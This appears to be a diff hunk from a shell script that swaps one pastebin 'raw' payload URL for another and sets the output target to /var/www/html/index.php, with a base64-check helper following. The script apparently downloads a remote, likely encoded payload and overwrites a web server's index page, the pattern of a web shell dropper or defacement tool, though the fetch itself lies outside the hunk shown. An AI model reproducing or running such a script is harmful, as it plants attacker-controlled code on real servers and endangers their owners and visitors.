@@ -9,7 +9,7 @@ CURL_OPTS="-s"
 OUTPUT_PATH="/var/www/html"
 OUTPUT_NAME="index.php"
 OUTPUT=$OUTPUT_PATH/$OUTPUT_NAME
-PAYLOAD_URL="https://pastebin.com/raw/XrkWc7nY"
+PAYLOAD_URL="https://pastebin.com/raw/rcUH9Qq9"
 
 check_base64(){
 	BASE64=$(which base64)
